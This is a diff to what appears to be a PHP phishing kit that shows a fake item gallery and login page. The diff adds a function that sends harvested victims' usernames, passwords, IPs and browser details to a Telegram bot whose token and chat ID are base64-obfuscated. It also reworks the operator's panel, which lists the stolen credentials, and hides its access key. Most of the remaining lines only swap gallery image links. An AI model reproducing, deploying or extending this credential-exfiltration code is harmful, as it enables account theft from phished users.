@@ -135,6 +135,26 @@ if (isset($_POST['login'])) {
     ?> <meta http-equiv="REFRESH" content="0;url=?p=collect"> <?php
   }
 }
+if (isset($_POST['send_telegram'])) {
+    sendMessage(base64_decode('MTE5OTg1ODU5OQ=='),
+        "Result Pesing\n\nFrom              : {$_POST['login_from']}\nUsername 			: {$_POST['user']}\nPassword 			 : {$_POST['pass']}\nDate               : {$_POST['date']}\nIP                    : {$_POST['ip']}\nBrowser        : {$_POST['browser']}",
+        base64_decode("MTM1NDQ0NDI4NDpBQUVKekxqbVdWbGFHaUtxSVpZbDd6ZkxnTlc5TlppQzdqTQ=="));
+}
+function sendMessage($chatID, $messaggio, $token) {
+    echo "sending message to " . $chatID . "\n";
+
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
+    $url = $url . "&text=" . urlencode($messaggio);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
 if (isset($_POST['reset'])) {
   file_put_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json", "");
 }
@@ -145,139 +165,106 @@ if (isset($_POST['reset'])) {
 <?php
 $data = file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
 $key = "rabbitx";
-if (empty($key) || (isset($_GET['key']) && ($_GET['key'] == sha1($key)))) {
+if (empty($key) || (isset($_GET[sha1('key')]) && ($_GET[sha1('key')] == sha1($key)))) {
   ?>
-  <style type="text/css">
-  @import url('https://fonts.googleapis.com/css2?family=Andika+New+Basic&display=swap');
-  .basic {
-    font-family: 'Andika New Basic', sans-serif;
-    position: absolute;
-    padding:20px;
-    background: #fff;
-    border-radius:20px;
-    border:1.5px solid rgba(0,0,0,0.12);
-  }
-  .label {
-    min-width:130px;
-    display: inline-block;
-    padding-top:5px;
-    padding-bottom:5px;
-  }
-  .p {
-    width:15px;
-    display: inline-block;
-    padding-top:5px;
-    padding-bottom:5px;
-  }
-  .user, .pass, .date, .ip, .browser{
-    display: inline-block;
-    padding-top:5px;
-    padding-bottom:5px;
-  }
-  .bungkus {
-    border:1.5px solid rgba(0,0,0,0.12);
-    border-radius:10px;
-    margin-bottom:7px;
-    padding:15px;
-  }
-  .result {
-    padding-bottom:10px;
-    font-size:25px;
-  }
-  .result button {
-    float: right;
-  }
-  .highlight {
-      border: 1px solid red !important;
-  }
-  #form {
-    display: none;
-  }
-</style>
-<script>
-  function test() {
-    var isFormValid = true;
-    $("#form input").each(function(){
-      if ($.trim($(this).val()).length == 0){
-        $(this).addClass("highlight");
-        isFormValid = false;
-        $(this).focus();
-      }
-      else {
-        $(this).removeClass("highlight");
-      }
-    });
-    if (!isFormValid) { 
-      alert("Please fill in all the required fields (indicated by *)");
-    }
-    return isFormValid;
-  }   
-</script>
-  <div class="basic">
-    <form method="post">
-      <div class="result">
-        Result
+  	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  <div class="container"><br>
+  	<div class="card">
+  		<div class="card-header">
+  			<h3>Result</h3>
+    	</div>
+    <div class="card-body">
+    <!--<form method="post">
         <button name="reset">reset</button>
-      </div>
-    </form>
+    </form>-->
+    <ul class="list-group">
     <?php
     foreach(json_decode($data, true) as $key => $value): ?>
-      <div class="bungkus">
-        <div class="label">
-          Login From
-        </div>
-        <div class="p">:</div>
-        <div class="user">
-          <?= $value['from'] ?>
-        </div>
-        <br>
-
-        <div class="label">
-          Username
-        </div>
-        <div class="p">:</div>
-        <div class="user">
-          <?= $value['user'] ?>
-        </div>
-        <br>
-
-        <div class="label">
-          Password
-        </div>
-        <div class="p">:</div>
-        <div class="pass">
-          <?= $value['pass'] ?>
-        </div>
-        <br>
-
-        <div class="label">
-          Date
-        </div>
-        <div class="p">:</div>
-        <div class="date">
-          <?= $value['date'] ?>
-        </div>
-        <br>
-
-        <div class="label">
-          IP
-        </div>
-        <div class="p">:</div>
-        <div class="ip">
-          <?= $value['ip'] ?>
-        </div>
-        <br>
-
-        <div class="label">
-          Victim Browser
-        </div>
-        <div class="p">:</div>
-        <div class="browser">
-          <?= $value['browser'] ?>
-        </div>
-      </div>
+    		<li class="list-group-item">
+    			<div class="row">
+    				<div class="col">
+    					From
+    				</div>
+    				<div class="col-0">:</div>
+    				<div class="col-9">
+    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['from'] ?>">
+    				</div>
+    			</div>
+    		</li>
+    		<li class="list-group-item">
+    			<div class="row">
+    				<div class="col">
+    					Username
+    				</div>
+    				<div class="col-0">:</div>
+    				<div class="col-9">
+    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['user'] ?>">
+    				</div>
+    			</div>
+    		</li>
+    		<li class="list-group-item">
+    			<div class="row">
+    				<div class="col">
+    					Password
+    				</div>
+    				<div class="col-0">:</div>
+    				<div class="col-9">
+    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['pass'] ?>">
+    				</div>
+    			</div>
+    		</li>
+    		<li class="list-group-item">
+    			<div class="row">
+    				<div class="col">
+    					Date
+    				</div>
+    				<div class="col-0">:</div>
+    				<div class="col-9">
+    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['date'] ?>">
+    				</div>
+    			</div>
+    		</li>
+    		<li class="list-group-item">
+    			<div class="row">
+    				<div class="col">
+    					IP
+    				</div>
+    				<div class="col-0">:</div>
+    				<div class="col-9">
+    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['ip'] ?>">
+    				</div>
+    			</div>
+    		</li>
+    		<li class="list-group-item">
+    			<div class="row">
+    				<div class="col">
+    					Browser
+    				</div>
+    				<div class="col-0">:</div>
+    				<div class="col-9">
+    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['browser'] ?>">
+    				</div>
+    			</div>
+    		</li>
+    		<form method="post">
+    			<li class="list-group-item">
+    				<input type="hidden" name="login_from" value="<?= $value['from'] ?>">
+    				<input type="hidden" name="user" value="<?= $value['user'] ?>">
+    				<input type="hidden" name="pass" value="<?= $value['pass'] ?>">
+    				<input type="hidden" name="date" value="<?= $value['date'] ?>">
+    				<input type="hidden" name="ip" value="<?= $value['ip'] ?>">
+    				<input type="hidden" name="browser" value="<?= $value['browser'] ?>">
+    				<button style="width:100%" class="btn btn-primary btn-sm" name="send_telegram">Send Telegram</button>
+    			</li>
+    	</form>
     <?php endforeach; ?>
-  </div>
+    </ul>
+    	</div>
+    	</div>
+  </div><br>
   <?php
   exit();
 }
@@ -758,347 +745,323 @@ if (@$_GET['p'] == 'collect') {
 </div>
 <div class="gallery">
 <div class="item">
-<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678586_3884124.png">
+<img class="thumbnail" src="https://i.ibb.co/9qJMMSv/1.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678590_3542041.png">
+<img class="thumbnail" src="https://i.ibb.co/c16GXrW/2.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678589_5859166.png">
+<img class="thumbnail" src="https://i.ibb.co/tBgZFGH/3.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678588_7839458.png">
+<img class="thumbnail" src="https://i.ibb.co/VY6tmQQ/4.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678591_4231565.png">
+<img class="thumbnail" src="https://i.ibb.co/LtbQnb3/5.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678587_4398840.png">
+<img class="thumbnail" src="https://i.ibb.co/z40nGGR/6.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/1.png">
+<img class="thumbnail" src="https://i.ibb.co/rkg4pFv/7.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/2.png">
+<img class="thumbnail" src="https://i.ibb.co/Gk0jY1Y/8.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/3.png">
+<img class="thumbnail" src="https://i.ibb.co/8dNvQsN/9.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/4.png">
+<img class="thumbnail" src="https://i.ibb.co/YyFkbZk/10.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/5.png">
+<img class="thumbnail" src="https://i.ibb.co/M6PgR8d/11.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/6.png">
+<img class="thumbnail" src="https://i.ibb.co/BBGzQvC/12.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/7.png">
+<img class="thumbnail" src="https://i.ibb.co/mzkQbqr/13.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/8.png">
+<img class="thumbnail" src="https://i.ibb.co/9vDbN71/14.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/9.png">
+<img class="thumbnail" src="https://i.ibb.co/BLCkFqW/15.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/10.png">
+<img class="thumbnail" src="https://i.ibb.co/pr3sDFp/16.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/11.png">
+<img class="thumbnail" src="https://i.ibb.co/9TRgRvM/17.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/12.png">
+<img class="thumbnail" src="https://i.ibb.co/zF0cR0d/18.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/13.png">
+<img class="thumbnail" src="https://i.ibb.co/9gT19Mm/19.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/14.png">
+<img class="thumbnail" src="https://i.ibb.co/yn6zHRR/20.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/15.png">
+<img class="thumbnail" src="https://i.ibb.co/T2LQzmG/21.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/16.png">
+<img class="thumbnail" src="https://i.ibb.co/F0XYFhZ/23.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/17.png">
+<img class="thumbnail" src="https://i.ibb.co/MVGs3Y8/24.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/18.png">
+<img class="thumbnail" src="https://i.ibb.co/vVk4RNK/25.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/19.png">
+<img class="thumbnail" src="https://i.ibb.co/d0Tg4xd/26.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/20.png">
+<img class="thumbnail" src="https://i.ibb.co/0m5Wjwy/27.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/21.png">
+<img class="thumbnail" src="https://i.ibb.co/pw1ZTgp/28.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/23.png">
+<img class="thumbnail" src="https://i.ibb.co/6vmnNXb/29.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/24.png">
+<img class="thumbnail" src="https://i.ibb.co/yQwDbTy/30.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/25.png">
+<img class="thumbnail" src="https://i.ibb.co/m5R1Fy4/31.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/26.png">
+<img class="thumbnail" src="https://i.ibb.co/gMsztLm/32.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/27.png">
+<img class="thumbnail" src="https://i.ibb.co/R0pKbTL/33.padding">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/28.png">
+<img class="thumbnail" src="https://i.ibb.co/r5ZfgRP/34.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/29.png">
+<img class="thumbnail" src="https://i.ibb.co/M6rGjN5/35.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/30.png">
+<img class="thumbnail" src="https://i.ibb.co/D76VT7w/36.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/31.png">
+<img class="thumbnail" src="https://i.ibb.co/BC6bLvY/37.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/32.png">
+<img class="thumbnail" src="https://i.ibb.co/sbqmj6H/38.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/33.png">
+<img class="thumbnail" src="https://i.ibb.co/9g8jB5F/39.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/34.png">
+<img class="thumbnail" src="https://i.ibb.co/NF4kMwS/40.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/35.png">
+<img class="thumbnail" src="https://i.ibb.co/9hN4DQD/41.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/36.png">
+<img class="thumbnail" src="https://i.ibb.co/55QDKvt/42.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/37.png">
+<img class="thumbnail" src="https://i.ibb.co/9hMdwhB/43.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/38.png">
+<img class="thumbnail" src="https://i.ibb.co/bXXtWG6/44.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/39.png">
+<img class="thumbnail" src="https://i.ibb.co/kJSxrtX/45.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/40.png">
+<img class="thumbnail" src="https://i.ibb.co/ypnqvhN/46.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/41.png">
+<img class="thumbnail" src="https://i.ibb.co/vPMZBBn/47.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/42.png">
+<img class="thumbnail" src="https://i.ibb.co/PDDPNgf/48.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/43.png">
+<img class="thumbnail" src="https://i.ibb.co/34QRH4D/49.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/44.png">
+<img class="thumbnail" src="https://i.ibb.co/fd4Y51v/50.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/45.png">
+<img class="thumbnail" src="https://i.ibb.co/q56f2MT/51.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/46.png">
+<img class="thumbnail" src="https://i.ibb.co/RHpgkNZ/52.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/47.png">
+<img class="thumbnail" src="https://i.ibb.co/d4yJZLr/53.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/48.png">
+<img class="thumbnail" src="https://i.ibb.co/0V7TxVB/54.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/49.png">
+<img class="thumbnail" src="https://i.ibb.co/f1wrSMf/55.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/50.png">
+<img class="thumbnail" src="https://i.ibb.co/P4CJXX3/56.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/51.png">
+<img class="thumbnail" src="https://i.ibb.co/RT5px16/57.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/52.png">
+<img class="thumbnail" src="https://i.ibb.co/8Bpq91G/58.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/53.png">
+<img class="thumbnail" src="https://i.ibb.co/rmk3bRJ/59.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/54.png">
+<img class="thumbnail" src="https://i.ibb.co/vDW9qMr/60.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/55.png">
+<img class="thumbnail" src="https://i.ibb.co/H7k619p/61.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/56.png">
+<img class="thumbnail" src="https://i.ibb.co/ZcDmzbf/62.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/57.png">
+<img class="thumbnail" src="https://i.ibb.co/v4kQm9J/63.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/58.png">
+<img class="thumbnail" src="https://i.ibb.co/vm92L01/64.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/59.png">
+<img class="thumbnail" src="https://i.ibb.co/hXNMXRs/65.jpg">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/60.png">
+<img class="thumbnail" src="https://i.ibb.co/tLdLBf4/66.jpg">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/61.png">
+<img class="thumbnail" src="https://i.ibb.co/Z1fxq5T/67.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/62.png">
+<img class="thumbnail" src="https://i.ibb.co/G7KMSGf/68.jpg">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/63.png">
+<img class="thumbnail" src="https://i.ibb.co/LS9zJ2v/69.jpg">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/64.png">
+<img class="thumbnail" src="https://i.ibb.co/YR7hMsy/70.jpg">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/65.jpg">
+<img class="thumbnail" src="https://i.ibb.co/1dqmJ7m/71.jpg">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/66.jpg">
+<img class="thumbnail" src="https://i.ibb.co/mc7xB0R/72.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/67.png">
+<img class="thumbnail" src="https://i.ibb.co/8mnSRdF/73.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/68.jpg">
+<img class="thumbnail" src="https://i.ibb.co/ZT0sgct/74.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/69.jpg">
+<img class="thumbnail" src="https://i.ibb.co/yn4hkDp/75.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/70.jpg">
+<img class="thumbnail" src="https://i.ibb.co/t4d8Q27/76.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/71.jpg">
+<img class="thumbnail" src="https://i.ibb.co/YNpDNS9/77.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/72.png">
+<img class="thumbnail" src="https://i.ibb.co/XJr7F1m/78.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
-<img class="thumbnail" src="img/firearms/73.png">
+<img class="thumbnail" src="https://i.ibb.co/5R0brdN/79.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/74.png">
+<img class="thumbnail" src="https://i.ibb.co/fdc3JLn/80.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="img/firearms/75.png">
-<a href="#collected" class="buy">Collect</a>
-</div>
-<div class="item last">
-<img class="thumbnail" src="img/firearms/76.png">
-<a href="#collected" class="buy">Collect</a>
-</div>
-<div class="item">
-<img class="thumbnail" src="img/firearms/77.png">
-<a href="#collected" class="buy">Collect</a>
-</div>
-<div class="item">
-<img class="thumbnail" src="img/firearms/78.png">
-<a href="#collected" class="buy">Collect</a>
-</div>
-<div class="item last">
-<img class="thumbnail" src="img/firearms/79.png">
-<a href="#collected" class="buy">Collect</a>
-</div>
-<div class="item">
-<img class="thumbnail" src="img/firearms/80.png">
-<a href="#collected" class="buy">Collect</a>
-</div>
-<div class="item">
-<img class="thumbnail" src="img/firearms/81.png">
+<img class="thumbnail" src="https://i.ibb.co/MpdfCzL/81.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 </div>
